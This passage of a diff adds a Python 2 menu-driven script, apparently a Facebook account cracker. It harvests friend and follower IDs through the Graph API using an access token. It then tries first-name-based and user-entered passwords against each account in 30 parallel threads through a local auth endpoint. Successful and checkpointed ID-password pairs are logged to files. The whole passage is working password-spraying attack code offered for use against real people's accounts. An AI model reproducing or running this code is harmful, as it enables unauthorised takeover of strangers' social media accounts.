+                id.append(line.strip())
+        except (KeyError, IOError):
+            print ''
+            print '\tRequested file not found'
+            print ''
+            raw_input(' Press enter to back ')
+            crack()
+        
+
+    if select == '0':
+        menu()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        crack_select()
+    print ' Total IDs : ' + str(len(id))
+    print ' The Process has started'
+    print 47 * '-'
+    print ''
+    
+    def main(arg):
+        user = arg
+        (uid, name) = user.split('|')
+        
+        try:
+            pass1 = name.lower() + p1
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/successful.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                cp = open('checkpoint.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                pass2 = name.lower() + p2
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/successful.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    cp = open('checkpoint.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    pass3 = name.lower() + p3
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/successful.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        cp = open('checkpoint.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        pass4 = name.lower() + p4
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/successful.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            cp = open('checkpoint.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+        except:
+            pass
+        
+
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print ''
+    print 47 * '-'
+    print ''
+    print ' The process has completed'
+    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ''
+    print 47 * '-'
+    print ''
+    raw_input(' Press enter to back')
+    crack()
+
+
+def ex_id():
+    global token
+    idg = []
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except IOError:
+        print '\tToken not found'
+        print ''
+        time.sleep(1)
+        login_choice()
+
+    os.system('clear')
+    print logo
+    print ''
+    print '\tCOLLECT PUBLIC ID WITH OPEN FRIENDLIST'
+    print ''
+    idh = raw_input(' Input Id: ')
+    
+    try:
+        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers = header)
+        q = json.loads(r.text)
+        print ' Collecting from: ' + q['name']
+    except KeyError:
+        print ''
+        print '\tInvalid id provided'
+        print ''
+        raw_input(' Press enter to back')
+        menu()
+
+    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers = header)
+    q = json.loads(r.text)
+    ids = open('ids_friends.txt', 'w')
+    for i in q['data']:
+        uid = i['id']
+        na = i['name']
+        nm = na.rsplit(' ')[0]
+        idg.append(uid + '|' + nm)
+        ids.write(uid + '|' + nm + '\n')
+    
+    ids.close()
+    print ''
+    print 47 * '-'
+    print ''
+    print ' The process has completed'
+    print ' Total ids: ' + str(len(idg))
+    print ''
+    print 47 * '-'
+    print ''
+    raw_input(' Press enter to download file')
+    os.system('cp ids_friends.txt /sdcard')
+    os.system('rm -rf ids_friends.txt')
+    print ' File downloaded successfully'
+    time.sleep(1)
+    menu()
+
+
+def choice():
+    global token
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except IOError:
+        print ''
+        print '\tToken not found'
+        time.sleep(1)
+        login_choice()
+
+    os.system('clear')
+    print logo
+    print ''
+    print '\tDigit pass cracking'
+    print ''
+    print '[1] Crack public id'
+    print '[2] Crack followers'
+    print '[3] Crack file'
+    print '[0] Back'
+    print ''
+    choice_select()
+
+
+def choice_select():
+    select = raw_input('Choose option: ')
+    id = []
+    oks = []
+    cps = []
+    if select == '1':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tDigit pass cracking'
+        print ''
+        pass1 = raw_input(' Password: ')
+        pass2 = raw_input(' Password: ')
+        pass3 = raw_input(' Password: ')
+        pass4 = raw_input(' Password: ')
+        idt = raw_input(' Input id: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
+            q = json.loads(r.text)
+            os.system('clear')
+            print logo
+            print ''
+            print '\tDigit pass cracking'
+            print ' Cloning from : ' + q['name']
+        except KeyError:
+            print '\tInvalid id link'
+            print ''
+            raw_input(' Press enter to back')
+            choice()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif select == '2':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tDigit pass cracking'
+        print ''
+        pass1 = raw_input(' Password: ')
+        pass2 = raw_input(' Password: ')
+        pass3 = raw_input(' Password: ')
+        pass4 = raw_input(' Password: ')
+        idt = raw_input(' Input id: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
+            q = json.loads(r.text)
+            os.system('clear')
+            print logo
+            print ''
+            print '\tDigit pass cracking'
+            print ''
+            print ' Cloning from: ' + q['name']
+        except KeyError:
+            print '\tInvalid id link'
+            print ''
+            raw_input(' Press enter to back')
+            choice()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif select == '3':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tDigit pass cracking'
+        print ''
+        pass1 = raw_input(' Password: ')
+        pass2 = raw_input(' Password: ')
+        pass3 = raw_input(' Password: ')
+        pass4 = raw_input(' Password: ')
+        filelist = raw_input(' Input file: ')
+        os.system('clear')
+        print logo
+        print ''
+        print '\tDigit pass cracking'
+        print ''
+        
+        try:
+            for line in open(filelist, 'r').readlines():
+                id.append(line.strip())
+        except (KeyError, IOError):
+            print ''
+            print '\tRequested file not found'
+            print ''
+            raw_input(' Press enter to back ')
+            choice()
+        
+
+    if select == '0':
+        menu()
+    else:
+        print ''
+        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
+        print ''
+        choice_select()
+    print ' Total IDs : ' + str(len(id))
+    print ' The Process has started'
+    print 47 * '-'
+    print ''
+    
+    def main(arg):
+        user = arg
+        (uid, name) = user.split('|')
+        
+        try:
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/successful.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                cp = open('checkpoint.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/successful.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    cp = open('checkpoint.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/successful.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        cp = open('checkpoint.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/successful.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print ' \x1b[1;33m[MARK-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            cp = open('checkpoint.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+        except:
+            pass
+        
+
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print ''
+    print 47 * '-'
+    print ''
+    print ' The process has completed'
+    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ''
+    print 47 * '-'
+    print ''
+    raw_input(' Press enter to back')
+    choice()
+
+if __name__ == '__main__':
+    reg()
